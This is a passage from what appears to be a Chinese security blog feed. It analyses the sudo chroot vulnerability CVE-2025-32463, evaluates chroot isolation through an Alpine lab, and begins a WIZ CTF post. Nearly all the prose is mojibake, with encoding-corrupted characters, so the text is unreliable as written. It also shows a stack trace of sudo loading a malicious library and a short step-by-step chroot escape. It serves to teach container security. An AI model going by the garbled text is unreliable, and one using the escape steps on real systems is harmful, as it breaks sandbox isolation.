<code>sudo</code> åŠ è½½ä»»æ„çš„å…±äº«å¯¹è±¡ï¼Œä»è€Œå®ç°ä»¥ <code>root</code> æƒé™æ‰§è¡Œä»»æ„ä»£ç ã€‚å®˜æ–¹æ‰€æä¾›çš„è°ƒç”¨æ ˆæ˜¾ç¤ºäº† <code>sudo</code> åŠ è½½çš„æ¶æ„å…±äº«å¯¹è±¡ï¼ˆä¸ºç®€æ´èµ·è§ï¼Œè¯¥æ ˆä¿¡æ¯å·²è¢«å¤§é‡ç²¾ç®€ï¼‰ã€‚</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs text">#0  0x0000763a155db181 in woot () from libnss_/woot1337.so.2<br>#1  0x0000763a1612271f in call_init<br>#8  0x0000763a1612a164 in _dl_open (file=&quot;libnss_/woot1337.so.2&quot;, <br>#14 0x0000763a15f53a0f in module_load<br>#15 0x0000763a15f53ee5 in __nss_module_load<br>#17 0x0000763a15f5460b in __GI___nss_lookup_function<br>#19 0x0000763a15f50928 in __GI___nss_passwd_lookup2<br>#20 0x0000763a15f62628 in __getpwnam_r <br>#21 0x0000763a15d59ae8 in pam_modutil_getpwnam<br>#27 0x0000763a15d58d99 in pam_acct_mgmt<br>#28 0x0000763a1577e491 in sudo_pam_approval<br>#29 0x0000763a157ce3ef in sudo_auth_approval<br>#30 check_user.constprop.0<br>#32 0x0000763a15799143 in sudoers_check_cmnd<br>#33 sudoers_policy_check<br>#34 0x00005ba00874b491 in policy_check<br>#35 main<br></code></pre></td></tr></table></figure><p>æ­¤<a href="https://github.com/sudo-project/sudo/commit/fffcc07c536d8eb69df4fb2d24a094982b09086c" title="è¡¥ä¸">è¡¥ä¸</a>æœ¬è´¨ä¸Šå›é€€åˆ°äº† <code>sudo</code> 1.9.14 ä¸­å®ç°çš„æ›´æ”¹ã€‚<code>pivot_root()</code>å’Œ<code>unpivot_root()</code>å‡½æ•°è¢«ç§»é™¤ï¼Œå¹¶ä¸”åœ¨å‘½ä»¤åŒ¹é…é˜¶æ®µä¸å†è°ƒç”¨<code>chroot()</code>ã€‚åº”ç”¨è¡¥ä¸åï¼Œæ¼æ´åˆ©ç”¨å°†å¤±è´¥ï¼Œå› ä¸ºä¸å†è°ƒç”¨<code>chroot()</code>ã€‚</p><p><img src="/image/image_zjRVFNRVfB.png" alt="å›¾ 36ï¼šCVE-2025-32463 çš„è¡¥ä¸" title="å›¾ 36ï¼šCVE-2025-32463 çš„è¡¥ä¸"></p><h2 id="0x03-chroot-çš„å®‰å…¨éš”ç¦»æ€§è¯„ä¼°"><a href="#0x03-chroot-çš„å®‰å…¨éš”ç¦»æ€§è¯„ä¼°" class="headerlink" title="0x03 chroot çš„å®‰å…¨éš”ç¦»æ€§è¯„ä¼°"></a>0x03 chroot çš„å®‰å…¨éš”ç¦»æ€§è¯„ä¼°</h2><p>å‰é¢æˆ‘ä»¬å‘ç°ï¼Œ<code>sudo</code> çš„ <code>--chroot</code> å‚æ•°çš„å®ç°å‡½æ•°åç§°è™½ç„¶æ˜¯<code>pivot_root()</code>ï¼Œä½†å®é™…ä¸Šæ˜¯ç›´æ¥è°ƒç”¨äº†<code>chroot</code> æ¥å®ç°çš„ã€‚ç”±äºæµ·æŠ¥å®£ä¼ æˆ‘ä»¬ä¸ä»…éœ€è¦äº†è§£å®¹å™¨å®ç°çš„åº•å±‚åŸç†ï¼Œè¿˜éœ€è¦è¯„ä¼° <code>chroot</code> çš„å®‰å…¨éš”ç¦»æ€§ã€‚æœ€åï¼Œè®©æˆ‘ä»¬ï¼š</p><ul><li>é€šè¿‡åœ¨ ubuntu ä¸»æœºä¸Šè¿è¡Œ Alpine æ¥è§£é‡Šå®¹å™¨å®ç°çš„åº•å±‚åŸç†ï¼›</li><li>å­¦ä¹  <code>chroot</code>å¸¸è§çš„ä¸¤ä¸ªé£é™©ï¼šä¸æ¸…ç†ç¯å¢ƒå˜é‡å’Œ <code>chroot</code> è¶Šç‹±ï¼›</li><li>ç°ä»£å®¹å™¨å®ç°æ ¹ç›®å½•åˆ‡æ¢çš„æŠ€æœ¯ã€‚</li></ul><h3 id="3-1-å®éªŒï¼šåœ¨-ubuntu-ä¸»æœºä¸Šè¿è¡Œ-Alpine"><a href="#3-1-å®éªŒï¼šåœ¨-ubuntu-ä¸»æœºä¸Šè¿è¡Œ-Alpine" class="headerlink" title="3.1 å®éªŒï¼šåœ¨ ubuntu ä¸»æœºä¸Šè¿è¡Œ Alpine"></a>3.1 å®éªŒï¼šåœ¨ ubuntu ä¸»æœºä¸Šè¿è¡Œ Alpine</h3><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œå®¹å™¨å…¶å®åªæ˜¯å®¿ä¸»æœºä¸Šä¸€ä¸ªç‰¹æ®Šçš„è¿›ç¨‹ï¼Œå½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªå®¹å™¨æ—¶ï¼Œè¿™ä¸ªå®¹å™¨ã€ä¹Ÿå°±æ˜¯è¿™ä¸ªè¿›ç¨‹çš„æ ¹ï¼ˆrootï¼‰ç›®å½•å°±ä¼šè¢«æ›´æ”¹ã€‚æ‰€ä»¥åœ¨å®¹å™¨å†…éƒ¨ï¼Œæˆ‘ä»¬æ˜¯çœ‹ä¸åˆ°å®Œæ•´çš„å®¿ä¸»æœºçš„æ–‡ä»¶ç³»ç»Ÿçš„ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬åšä¸€ä¸ªå°å®éªŒï¼Œé‚£å°±æ˜¯ï¼šé€šè¿‡ä½¿ç”¨<code>chroot</code> åœ¨å®¿ä¸»æœºä¸Šè¿è¡Œ Alpineã€‚</p><p>å®¹å™¨æ˜¯é•œåƒå®ä¾‹åŒ–çš„ç»“æœï¼Œæ‰€ä»¥é•œåƒéœ€è¦å°è£…å®¹å™¨æ‰€éœ€è¦çš„æ–‡ä»¶ç³»ç»Ÿï¼Œè‹¥è¯¥æ–‡ä»¶ç³»ç»Ÿæ²¡æœ‰æ‰€è¦è¿è¡Œçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œé‚£ä¹ˆå®¹å™¨å°†æ— æ³•æ‰¾åˆ°å¹¶è¿è¡Œå®ƒä»¬ã€‚</p><ol><li><p>æ ¹æ®ç³»ç»Ÿæ¶æ„ï¼Œåˆ°å®˜ç½‘ä¸‹è½½ä¸€ä¸ªç‰¹å®šç‰ˆæœ¬çš„æœ€å°åŒ–æ ¹æ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶ä¿å­˜ä¸º <code>alpine.tar.gz</code> å‹ç¼©åŒ…ã€‚è¿™é‡Œä»¥ <code>v3.9</code> ç‰ˆæœ¬ä¸ºä¾‹è¿›è¡Œè¯´æ˜ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">arch</span>=$(<span class="hljs-built_in">uname</span> -m); curl -o alpine.tar.gz http://dl-cdn.alpinelinux.org/alpine/v3.9/releases/<span class="hljs-variable">$arch</span>/alpine-minirootfs-3.9.0-<span class="hljs-variable">$arch</span>.tar.gz<br></code></pre></td></tr></table></figure></li><li><p>åˆ›å»ºä¸€ä¸ªæ–°ç›®å½•ï¼Œä½œä¸º <code>alpine</code> çš„æ ¹ç›®å½•ï¼Œå¹¶å°†å‹ç¼©åŒ…è§£å‹è‡³æ–°çš„æ ¹ç›®å½•ä¸­ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªæœ€å°åŒ–çš„ Linux å‘è¡Œç‰ˆæ–‡ä»¶ç³»ç»Ÿäº†ã€‚ç”±äºå‹ç¼©åŒ…çš„ <code>/dev</code> ç›®å½•åŒ…å«ä¸€äº›è®¾å¤‡æ–‡ä»¶ç­‰ç‰¹æ®Šæ–‡ä»¶ï¼Œæ‰€ä»¥<code>tar</code> åœ¨è§£å‹è¿‡ç¨‹ä¸­ä¼šæŠ¥é”™ã€‚åœ¨è¿™é‡Œï¼Œæš‚æ—¶ä½¿ç”¨ <code>--exclude=&#39;./dev/*&#39;</code> æ¥å¿½ç•¥è¿™äº›æ–‡ä»¶å³å¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> alpine<br>tar --exclude=<span class="hljs-string">&#x27;./dev/*&#x27;</span> -xvf alpine.tar.gz -C alpine<br></code></pre></td></tr></table></figure></li><li><p>ç”±äº Alpine å‘è¡Œç‰ˆä¸åŒ…å« <code>bash</code> ï¼Œæ‰€ä»¥ä¸æŒ‡å®šä»»ä½•å‘½ä»¤ï¼Œç›´æ¥æ‰§è¡Œ <code>chroot</code> å‘½ä»¤ä¼šæŠ¥é”™ã€‚ä½†å¦‚æœæˆ‘ä»¬åœ¨åŒ…å« <code>bash</code> çš„ Linux å‘è¡Œç‰ˆï¼ˆä¾‹å¦‚ ubuntuï¼‰ä¸­æ‰§è¡ŒåŒæ ·çš„æ“ä½œå°±ä¼šæˆåŠŸã€‚åœ¨è¿™é‡Œï¼Œæ‰§è¡Œ <code>chroot</code> å‘½ä»¤æ—¶ï¼ŒæŒ‡å®š <code>sh</code> å³å¯è§£å†³é—®é¢˜ã€‚</p></li></ol><p><img src="/image/image_yTKKNRaN0K.png" alt="å›¾ 37ï¼šåœ¨ ubuntu ä¸»æœºä¸Šè¿è¡Œ Alpine Linux ç³»ç»Ÿ" title="å›¾ 37ï¼šåœ¨ ubuntu ä¸»æœºä¸Šè¿è¡Œ Alpine Linux ç³»ç»Ÿ"></p><p>å¦‚å›¾ 37 æ‰€ç¤ºï¼Œ<code>alpine</code> ä¸­çš„å†…å®¹çœ‹èµ·æ¥å°±åƒæ˜¯ä¸€ä¸ª Linux æ–‡ä»¶ç³»ç»Ÿçš„æ ¹ç›®å½•ï¼Œå…¶ä¸­åŒ…å«äº† <code>bin</code> ã€<code>lib</code> ã€<code>var</code> å’Œ <code>tmp</code> ç­‰ç›®å½•ã€‚é€šè¿‡ä½¿ç”¨ <code>chroot</code> å‘½ä»¤è¿‡åï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨ä¸»æœºä¸Šè¿è¡Œä¸€ä¸ªç®€å•çš„ Alpine äº†ã€‚å…¶å®è¿™ä¹Ÿæ­£æ˜¯å®¹å™¨æ‰€åšçš„äº‹æƒ…ï¼Œç„¶è€Œ <code>chroot</code> èƒŒåæ‰€åšçš„äº‹æƒ…æ¯”æƒ³è±¡ä¸­çš„è¦ç¨å¾®å¤æ‚ä¸€äº›ï¼Œè¿™é‡Œæˆ‘ä»¬å°±ä¸å±•å¼€è¿›è¡Œè¯´æ˜äº†ã€‚</p><p>ç¨å¾®æ€»ç»“ä¸€ä¸‹ï¼Œ<code>chroot</code> ä¸»è¦çš„åŠŸèƒ½å°±æ˜¯æ›´æ”¹å½“å‰è¿›ç¨‹çš„æ ¹ç›®å½•ã€‚å½“æ ¹ç›®å½•è¢«æ›´æ”¹åï¼Œå½“å‰è¿›ç¨‹åŠå…¶å­è¿›ç¨‹åªèƒ½è®¿é—®æ¯”æ–°æ ¹ç›®å½•å±‚æ¬¡æ›´ä½çš„æ–‡ä»¶å’Œç›®å½•ã€‚ä½†æ˜¯ <code>chroot</code>å‘½ä»¤ä¸éš”ç¦»å†…æ ¸èƒ½åŠ›ã€ä¸æ¸…ç†ç¯å¢ƒå˜é‡ã€ä»¥åŠä¸å±è”½ç³»ç»Ÿè°ƒç”¨æƒé™ï¼Œå¯¼è‡´ç”¨æˆ·åœ¨ä»ç„¶å¯ä»¥é€šè¿‡å„ç§æ–¹å¼â€œæ‰“ç ´æ²™ç®±â€ã€‚</p><h3 id="3-2-é£é™©ä¸€ï¼šç¯å¢ƒå˜é‡"><a href="#3-2-é£é™©ä¸€ï¼šç¯å¢ƒå˜é‡" class="headerlink" title="3.2 é£é™©ä¸€ï¼šç¯å¢ƒå˜é‡"></a>3.2 é£é™©ä¸€ï¼šç¯å¢ƒå˜é‡</h3><p>é¦–å…ˆï¼Œæˆ‘ä»¬æ¥å›ç­”åˆšåˆšé—ç•™çš„ä¸€ä¸ªé—®é¢˜ï¼šå¦‚å›¾ 37 æ‰€ç¤ºï¼Œä¸ºä»€ä¹ˆæ‰§è¡Œ<code>chroot</code>ä¸è¿½åŠ å‘½ä»¤ä¼šè¿è¡Œå¤±è´¥ã€‚é‚£æ˜¯å› ä¸ºï¼Œå½“æˆ‘ä»¬æ‰§è¡Œ<code>chroot</code> å‘½ä»¤æ—¶ï¼Œåªæ˜¯æ”¹å˜äº†å½“å‰è¿›ç¨‹çš„è·¯å¾„è§£æè¿‡ç¨‹ï¼Œ<code>chroot</code> çš„å­è¿›ç¨‹ä»ä¼šç»§æ‰¿çˆ¶è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ã€‚</p><p>ä¾‹å¦‚ï¼Œæˆ‘å¯ä»¥åœ¨ä¸»æœºä¸Šè®¾ç½®ç¯å¢ƒå˜é‡ <code>NAME</code> çš„å€¼ä¸º <code>Yaney</code> ï¼Œç„¶åä½¿ç”¨ <code>chroot</code> åˆ‡æ¢åˆ° Alpine çš„æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œæ¥ç€æˆ‘ä»¬å°±ä¼šå‘ç°ï¼šç¯å¢ƒå˜é‡ <code>NAME</code> å·²è¢«ç»§æ‰¿ã€‚</p><p><img src="/image/image_R7fVyAYU_m.png" alt="å›¾ 38ï¼šchroot ä¸ä¼šæ¸…ç†ç¯å¢ƒå˜é‡" title="å›¾ 38ï¼šchroot ä¸ä¼šæ¸…ç†ç¯å¢ƒå˜é‡"></p><p>æ­£å¦‚ <code>chroot</code> çš„æ‰‹å†Œæ‰€è¯´çš„é‚£æ ·ï¼Œè‹¥æˆ‘ä»¬æ²¡æœ‰è¿½åŠ ä»»ä½•å‘½ä»¤ï¼Œé‚£ä¹ˆå®ƒä¼šä½¿ç”¨ <code>$SHELL</code> çš„å€¼ã€‚å¦‚å›¾ 39 æ‰€ç¤ºï¼Œ<code>$SHELL</code>  çš„å€¼åœ¨æˆ‘ä»¬çš„ Ubuntu ä¸»æœºä¸Šå·²ç»è¢«è®¾ç½®ä¸º <code>/bin/bash</code> äº†ï¼Œ<code>chroot</code> çš„å­è¿›ç¨‹ä¼šç»§æ‰¿è¿™ä¸ªç¯å¢ƒå˜é‡ï¼Œç»§ç»­å¯»æ‰¾<code>/bin/bash</code> ï¼Œä½† Alpine å¹¶æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥å‘½ä»¤æ‰§è¡Œå¤±è´¥ã€‚</p><p><img src="/image/image_dxmCBrfNGX.png" alt="å›¾ 39ï¼šchroot ç¯å¢ƒä¼šç»§æ‰¿åŸæ¥çš„ $SHELL å’Œ $PATHï¼Œå› æ­¤æ— æ³•æ‰¾åˆ°å¯¹åº”çš„æ–‡ä»¶" title="å›¾ 39ï¼šchroot ç¯å¢ƒä¼šç»§æ‰¿åŸæ¥çš„ $SHELL å’Œ $PATHï¼Œå› æ­¤æ— æ³•æ‰¾åˆ°å¯¹åº”çš„æ–‡ä»¶"></p><p>æ­¤å¤–ï¼Œè‹¥æˆ‘ä»¬æƒ³æ‰§è¡Œ <code>ls</code> ç­‰å¸¸è§çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œä¹Ÿæ— éœ€æ˜¾ç¤ºåœ°æŒ‡å®šå…¶è·¯å¾„ã€‚å› ä¸ºåœ¨ä¸»æœºå’Œ <code>chroot</code> ç¯å¢ƒä¸­ï¼Œ<code>PATH</code> çš„å€¼å¹¶æœªè¢«æ”¹å˜ã€‚åªä¸è¿‡åœ¨ <code>chroot</code> ç¯å¢ƒä¸­ï¼Œ<code>alpine</code> æ ¹ç›®å½•ä¸­çš„ <code>bin</code> ç›®å½•è¢«è§£ææˆäº†æ–°è¿›ç¨‹çš„ <code>/bin</code> ç›®å½•ï¼Œè¯¥ç›®å½•å·²åŒ…å«äº† <code>ls</code> ç­‰å¸¸è§çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œ</p><p><img src="/image/image_GJouvfQyMF.png" alt="å›¾ 40ï¼šAlpine çš„ chroot ç¯å¢ƒä¸­å­˜åœ¨çš„æ–‡ä»¶" title="å›¾ 40ï¼šAlpine çš„ chroot ç¯å¢ƒä¸­å­˜åœ¨çš„æ–‡ä»¶"></p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåªæœ‰å­è¿›ç¨‹æ‰ä¼šè·å¾—æ–°çš„æ ¹ç›®å½•ï¼Œåœ¨å›¾ 41 çš„ä¾‹å­ä¸­ï¼ŒæŒ‡çš„æ˜¯è¿è¡Œ <code>ls</code>ã€<code>sh</code> å’Œ <code>cat</code> è¿™äº›è¿›ç¨‹ã€‚åªæœ‰æ‰§è¡Œ <code>exit</code> ç»“æŸ <code>sh</code> è¿›ç¨‹åï¼Œæ§åˆ¶æƒæ‰ä¼šè¿”è¿˜ç»™çˆ¶è¿›ç¨‹ã€‚</p><p><img src="/image/image_LDVxLo4-Rm.png" alt="å›¾ 41ï¼šåªæœ‰é€€å‡º chroot ç¯å¢ƒï¼Œæ§åˆ¶å™¨æ‰ä¼šè¿”å›ç»™çˆ¶è¿›ç¨‹" title="å›¾ 41ï¼šåªæœ‰é€€å‡º chroot ç¯å¢ƒï¼Œæ§åˆ¶å™¨æ‰ä¼šè¿”å›ç»™çˆ¶è¿›ç¨‹"></p><p>ä»ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å‘ç° <code>chroot</code> åªä¼šæ”¹å˜è·¯å¾„è§£æè¿‡ç¨‹ï¼Œè€Œä¸ä¼šåšå…¶å®ƒä»»ä½•äº‹æƒ…ï¼Œå› æ­¤å®ƒä¸é€‚åˆæ²™ç®±åŒ–ä¸€ä¸ªè¿›ç¨‹ï¼Œå› ä¸ºå®ƒä¹Ÿä¸ä¼šé™åˆ¶æ–‡ä»¶ç³»ç»Ÿçš„ç³»ç»Ÿè°ƒç”¨ã€‚è¿™ä¹Ÿæ˜¯<a href="https://man7.org/linux/man-pages/man2/chroot.2.html" title="ã€Šchroot(2) â€” Linux manual pageã€‹">ã€Šchroot(2) â€” Linux manual pageã€‹</a>æ˜ç¡®æŒ‡å‡ºçš„äº‹æƒ…ã€‚</p><p><img src="/image/image_DG6iu7M3JO.png" alt="å›¾ 42ï¼šchroot ä¸é€‚åˆå®Œå…¨æ²™ç®±åŒ–ä¸€ä¸ªè¿›ç¨‹" title="å›¾ 42ï¼šchroot ä¸é€‚åˆå®Œå…¨æ²™ç®±åŒ–ä¸€ä¸ªè¿›ç¨‹"></p><h3 id="3-3-é£é™©äºŒï¼šchroot-è¶Šç‹±"><a href="#3-3-é£é™©äºŒï¼šchroot-è¶Šç‹±" class="headerlink" title="3.3 é£é™©äºŒï¼šchroot è¶Šç‹±"></a>3.3 é£é™©äºŒï¼šchroot è¶Šç‹±</h3><p>åœ¨è¿‡å»çš„ç³»ç»Ÿä¸­ï¼Œå®ˆæŠ¤è¿›ç¨‹ä¸ºäº†æé«˜å®‰å…¨æ€§ï¼Œä¼šä½¿ç”¨ <code>chroot</code> æ¥é™åˆ¶è‡ªå·±è®¿é—®çš„æ–‡ä»¶ç³»ç»Ÿçš„èŒƒå›´ã€‚ä½†å¦‚æœä¸€ä¸ªæ–‡ä»¶å¤¹è¢«ç§»å‡ºäº† <code>chroot</code> ç¯å¢ƒï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ¥è¿›è¡Œè¶Šç‹±ã€‚æˆ‘ä»¬æ¥ä¸¾ä¸ªæœ€ç®€å•çš„ä¾‹å­ï¼š</p><ol><li><p>æ‰“å¼€ä¸€ä¸ªç»ˆç«¯ï¼Œè¿›å…¥ <code>alpine</code> çš„ <code>chroot</code> ç¯å¢ƒä¸­ï¼›</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chroot</span> alpine sh<br></code></pre></td></tr></table></figure></li><li><p>åˆ›å»ºä¸€ä¸ªæ–°çš„ç›®å½• <code>will_be_move</code>ï¼Œå¹¶å°†å…¶è®¾ç½®ä¸ºå½“å‰å·¥ä½œç›®å½•ï¼›</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> will_be_move <br><span class="hljs-built_in">chdir</span> will_be_move<br></code></pre></td></tr></table></figure></li><li><p>ç„¶åï¼Œæ‰“å¼€ä¸€ä¸ªæ–°çš„ç»ˆç«¯ï¼Œå°† <code>will_be_move</code>ç›®å½•ç§»å‡º<code>chroot</code>ç¯å¢ƒä¸­ï¼›</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mv</span> alpine/will_be_move ./<br></code></pre></td></tr></table></figure></li><li><p>è¿™æ ·ï¼Œæˆ‘ä»¬å°±é€ƒé€¸åˆ°ä¸»æœºç¯å¢ƒä¸­äº†ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ <code>â€¦/</code>æ¥æŸ¥çœ‹ä¸»æœºä¸Šçš„æ–‡ä»¶ã€‚</p></li></ol><p><img src="/image/image_EAbock-kFB.png" alt="å›¾ 43ï¼šchroot è¶Šç‹±" title="å›¾ 43ï¼šchroot è¶Šç‹±"></p><h3 id="3-4-pivot-root-ç³»ç»Ÿè°ƒç”¨"><a href="#3-4-pivot-root-ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="3.4 pivot_root ç³»ç»Ÿè°ƒç”¨"></a>3.4 <code>pivot_root</code> ç³»ç»Ÿè°ƒç”¨</h3><p>é™¤äº†æˆ‘ä»¬ç†Ÿæ‚‰çš„<code>chroot</code>ï¼Œè¿˜æœ‰ä¸€ä¸ªç±»ä¼¼çš„ç³»ç»Ÿè°ƒç”¨å«åš<code>pivot_root</code>ã€‚è¿™ä¸¤è€…çš„ç›®æ ‡å…¶å®æ˜¯ä¸€æ ·çš„ï¼šç»™å®¹å™¨ä¸€ä¸ªâ€œè‡ªå·±çš„æ ¹ç›®å½•â€ï¼Œå°±åƒæˆ‘ä»¬æŠŠå®¹å™¨æ”¾åœ¨ä¸€ä¸ªç‹¬ç«‹çš„å°ä¸–ç•Œé‡Œã€‚</p><p>åœ¨ä»Šå¤©çš„åˆ†äº«ä¸­ï¼Œæˆ‘ä»¬é€‰æ‹©ç”¨å¤§å®¶æ›´ç†Ÿæ‚‰çš„<code>chroot</code>æ¥åšæ¼”ç¤ºï¼Œå› ä¸ºå®ƒæ›´å®¹æ˜“ç†è§£ã€‚ä½†è¯·è®°ä½ï¼Œæ— è®ºæ˜¯<code>chroot</code>è¿˜æ˜¯<code>pivot_root</code>ï¼Œæ ¸å¿ƒç›®çš„éƒ½æ˜¯è®©å®¹å™¨æœ‰ä¸€å¥—ç‹¬ç«‹çš„æ ¹æ–‡ä»¶ç³»ç»Ÿï¼Œåªæ˜¯å®ç°æ–¹å¼ä¸åŒã€‚</p><p>ç®€å•æ¥è¯´ï¼Œ<code>pivot_root</code> å¯ä»¥æŠŠå½“å‰çš„æ ¹ç›®å½•æŒªåˆ°ä¸€ä¸ªå«<code>put_old</code> çš„ä¸´æ—¶ç›®å½•é‡Œï¼Œç„¶åæŠŠæ–°çš„ç›®å½•<code>new_root</code> è®¾ç½®ä¸ºæ•´ä¸ªç³»ç»Ÿçš„æ–°â€œåœ°åŸºâ€ã€‚è¿™æ ·ä¸€æ¥ï¼Œè¿›ç¨‹çœ‹åˆ°çš„æ ¹ç›®å½•å°±å®Œå…¨å˜äº†ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼š<code>new_root</code>å’Œ<code>put_old</code> ä¸èƒ½æ˜¯åŒä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸­çš„ç›®å½•ï¼Œè¿™æ ·åšæ˜¯ä¸ºäº†é¿å…æ··ä¹±å’Œå®‰å…¨é—®é¢˜ã€‚</p><p><code>chroot</code> æ›´åƒæ˜¯â€œæ¢ä¸ªçª—æˆ·çœ‹ä¸–ç•Œâ€ï¼Œè€Œ <code>pivot_root</code> æ˜¯â€œè¿åœ°åŸºä¸€èµ·æ¬å®¶â€ã€‚æ‰€ä»¥åœ¨çœŸæ­£çš„å®¹å™¨ç¯å¢ƒé‡Œï¼Œæ¯”å¦‚ Docker æˆ– Kubernetes åé¢çš„åº•å±‚è¿è¡Œæ—¶ï¼Œå¤§å®¶æ›´å€¾å‘äºä½¿ç”¨<code>pivot_root</code> æ¥è®¾ç½®å®¹å™¨çš„æ ¹æ–‡ä»¶ç³»ç»Ÿï¼Œå› ä¸ºè¿™æ ·æ›´å®‰å…¨ã€æ›´å½»åº•ã€‚</p><p>ä»¥ <a href="https://github.com/opencontainers/runc/blob/34c64e2a7f0695ac300bb4f1cb9375172b889148/libcontainer/rootfs_linux.go#L210" title="runc">runc</a> ä¸ºä¾‹ï¼Œæˆ‘ä»¬åœ¨æŸ¥çœ‹å…¶æºä»£ç çš„æ—¶å€™ï¼Œå°±å‘ç°å®ƒä½¿ç”¨çš„æ˜¯ <code>pivot_root</code> è€Œä¸æ˜¯ <code>chroot</code>ã€‚å› ä¸ºç»å¤§å¤šæ•°æƒ…å†µä¸‹ <code>config.Namespaces.Contains(configs.NEWNS)</code>çš„å€¼ä¸º <code>true</code>ï¼Œå› ä¸ºå®¹å™¨è¿è¡Œæ—¶çš„é»˜è®¤è¡Œä¸ºå°±æ˜¯å¯ç”¨æŒ‚è½½å‘½åç©ºé—´ï¼ˆmount namespaceï¼‰ã€‚è¿™æ—¶å€™å°±å¯ä»¥æ”¾å¿ƒä½¿ç”¨<code>pivot_root</code> å»å½»åº•æ¢æ ¹ï¼Œè€Œä¸ä¼šå½±å“å…¶ä»–è¿›ç¨‹ã€‚</p><p><img src="/image/image_QA7YDCrzgQ.png" alt="å›¾ 44ï¼šrunc å‡†å¤‡æ ¹æ–‡ä»¶ç³»ç»Ÿçš„æ ¸å¿ƒä»£ç " title="å›¾ 44ï¼šrunc å‡†å¤‡æ ¹æ–‡ä»¶ç³»ç»Ÿçš„æ ¸å¿ƒä»£ç "></p>]]></content>
    
    
    
    <tags>
      
      <tag>å®¹å™¨å®‰å…¨</tag>
      
      <tag>CVE æ¼æ´åˆ†æ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WIZ-2025 ç«æ ‡èµ› - ç¬¬ä¸€æœŸ (June)</title>
    <link href="/2025/07/03/WIZ-2025%E7%AB%9E%E6%A0%87%E8%B5%9B-%E7%AC%AC%E4%B8%80%E6%9C%9F-June/"/>
    <url>/2025/07/03/WIZ-2025%E7%AB%9E%E6%A0%87%E8%B5%9B-%E7%AC%AC%E4%B8%80%E6%9C%9F-June/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>WIZ è¿™å®¶å…¬å¸å¤§å®¶å¹¶ä¸é™Œç”Ÿï¼Œä½œä¸ºäº‘åŸç”Ÿå®‰å…¨é¢†åŸŸçš„é¢†å†›è€…å’Œäº‘ç ”ç©¶å­¦ä¹ çš„æ®¿å ‚çº§æœºæ„ï¼Œå®ƒæ¯å¹´éƒ½ä¼šå‡­å€Ÿâ€œèµ›åšä½›ç¥–â€èˆ¬çš„åˆ›æ–°åŠ›æ¨å‡ºå…¨æ–°çš„çº¿ä¸Šäº‘ CTF æ¯”èµ›ã€‚</p><p>è‡ªä»Šå¹´å…­æœˆèµ·ï¼Œä¸€åœºä¸ºæœŸæ•°æœˆçš„ CTF é”¦æ ‡èµ›æ­£å¼æ‹‰å¼€å¸·å¹•ã€‚è¿™åœºèµ›äº‹ç”± WIZ æ˜æ˜Ÿç ”ç©¶å‘˜ç²¾å¿ƒæ‰“é€ ï¼Œæ—¨åœ¨å¸®åŠ©å‚èµ›è€…ç£¨ç»ƒæŠ€èƒ½ã€‚å®ŒæˆæŒ‘æˆ˜å³å¯èµ¢å–ç§¯åˆ†ï¼Œå†²å‡»æ’è¡Œæ¦œï¼Œè§’é€ç»ˆæäº‘å† å†›çš„è£èª‰ã€‚</p><p><img src="/image/image_9PGoFKp3sU.png" alt="å›¾ 1ï¼šWIZ æ¨å‡ºçš„ CTF é”¦æ ‡èµ›" title="å›¾1ï¼šWIZ æ¨å‡ºçš„ CTF é”¦æ ‡èµ›"></p><p>ç¬”è€…è‡ªç„¶ä¸ä¼šé”™è¿‡ä»»ä½•ä¸€æœŸã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†ä¸€åŒæ¢è®¨æœ€æ–°ä¸€æœŸï¼Œä¹Ÿæ˜¯ç¬¬ä¸€æœŸçš„æ¯”èµ›ï¼Œå…¶ä¸»é¢˜ä¸ºï¼šPerimeter Leakï¼ˆå‘¨è¾¹æ³„æ¼ï¼‰ã€‚</p><blockquote><p>ğŸ¯ç‚¹å‡»ã€<a 